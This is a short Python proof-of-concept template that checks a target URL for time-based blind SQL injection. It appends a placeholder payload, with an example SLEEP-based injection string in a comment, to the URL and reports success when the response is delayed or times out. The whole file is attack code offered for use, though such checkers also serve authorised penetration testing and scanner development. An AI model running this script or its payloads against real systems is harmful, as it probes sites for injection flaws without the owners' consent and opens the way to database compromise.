import requests
import time
import sys

# Target Configuration
TARGET_URL = "{{TARGET}}"
PAYLOAD = "{{PAYLOAD}}" # e.g., "1' OR SLEEP(5)--"
BASELINE_DELAY = 1.0 # Expected normal response time

def check_vulnerability():
    print(f"[*] Testing {TARGET_URL} with payload: {PAYLOAD}")
    
    # Baseline Request
    start = time.time()
    try:
        requests.get(TARGET_URL, timeout=10)
    except Exception as e:
        print(f"[-] Baseline request failed: {e}")
        return False
    baseline_duration = time.time() - start
    print(f"[*] Baseline duration: {baseline_duration:.2f}s")
    
    # Attack Request
    # We assume the payload is injected into a query param. 
    # For robust template, we should parse URL and inject into params.
    # Simplified for PoC: Append payload to URL
    target_with_payload = f"{TARGET_URL}{PAYLOAD}"
    
    start = time.time()
    try:
        requests.get(target_with_payload, timeout=10)
    except requests.Timeout:
        print("[+] Request timed out (Potential Success)")
        return True
    except Exception as e:
         print(f"[-] Attack request failed: {e}")
         return False
         
    attack_duration = time.time() - start
    print(f"[*] Attack duration: {attack_duration:.2f}s")
    
    if attack_duration > (baseline_duration + 4.0):
        print("[+] SUCCESS: Time delay detected!")
        return True
        
    print("[-] Failed: No significant time delay.")
    return False

if __name__ == "__main__":
    if check_vulnerability():
        sys.exit(0)
    sys.exit(1)
